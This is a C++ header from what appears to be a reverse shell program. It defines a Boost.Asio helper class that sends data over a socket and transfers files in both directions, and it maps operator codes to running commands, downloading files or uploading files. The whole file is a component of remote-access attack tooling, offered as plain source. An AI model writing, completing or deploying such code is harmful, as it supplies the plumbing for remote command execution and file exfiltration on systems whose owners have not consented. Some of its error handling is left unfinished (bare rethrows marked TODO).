#pragma once

#include <array>
#include <fstream>
#include <boost/asio.hpp>
#include <string>
#include <iostream>
#include <filesystem>


template<typename T>
class SharedReverseShellUtils
{
public:
	SharedReverseShellUtils(T * caller)
		:m_caller(caller) {}

	template<typename Buffer>
	void Send(Buffer& t_buffer)
	{
		boost::asio::write(m_caller->m_socket, t_buffer, m_errorCode);
		if (m_errorCode)
			throw; // TODO - handle error (reset the connection & reset the m_errorCode to 0)
	}

	void Download(const std::string& filePath)
	{
		auto fileSize = std::stoi(Response());
		while (fileSize > 0)
		{
			auto bufferSize = (fileSize < m_caller->m_buf.size()) ? fileSize : m_caller->m_buf.size();
			auto buf = boost::asio::buffer(m_caller->m_buf, bufferSize);
			auto responseSize = boost::asio::read(m_caller->m_socket, buf, m_errorCode);
			m_caller->m_file.write(m_caller->m_buf.data(), responseSize);

			fileSize -= responseSize;
			std::cout << "Remaining bytes: " << fileSize << "\nResponse Size: " << responseSize << std::endl;
		}
		m_caller->m_file.close();
	}

	void Upload(int fileSize, boost::asio::streambuf& t_buffer)
	{
		Send(t_buffer);

		while (fileSize > 0)
		{
			m_caller->m_file.read(m_caller->m_buf.data(), m_caller->m_buf.size());
			if (m_caller->m_file.fail() && !m_caller->m_file.eof())
				throw std::fstream::failure("Failed while reading file");

			size_t bufferSize(m_caller->m_file.gcount());
			auto buf = boost::asio::buffer(m_caller->m_buf.data(), bufferSize);
			Send(buf);

			fileSize -= bufferSize;
		}
		m_caller->m_file.close();
	}

	std::string Response()
	{
		auto responseSize = boost::asio::read_until(m_caller->m_socket, m_caller->m_responseBuf, m_delimiter, m_errorCode);
		if (m_errorCode)
			throw; // TODO - handle error

		return CleanReponse(responseSize);
	}


private:
	std::string CleanReponse(size_t responseSize)
	{
		std::string response(
			buffers_begin(m_caller->m_responseBuf.data()),
			buffers_begin(m_caller->m_responseBuf.data()) + responseSize - m_delimiter.size()
		);
		m_caller->m_responseBuf.consume(responseSize);

		return response;
	}

public:
	enum OperationType { RunCommand = 1, DownloadFile, UploadFile, Invalid };
	OperationType GetOperationType(const std::string& operation)
	{
		std::unordered_map<std::string, OperationType> operations
		{
			{"1", RunCommand},
			{"2", DownloadFile},
			{"3", UploadFile}
		};

		if (!operations.count(operation))
			return Invalid;

		return operations[operation];
	}

private:
	T* m_caller;

public:
	boost::system::error_code m_errorCode;
	const std::string m_delimiter = "\r\n\r\n";
};
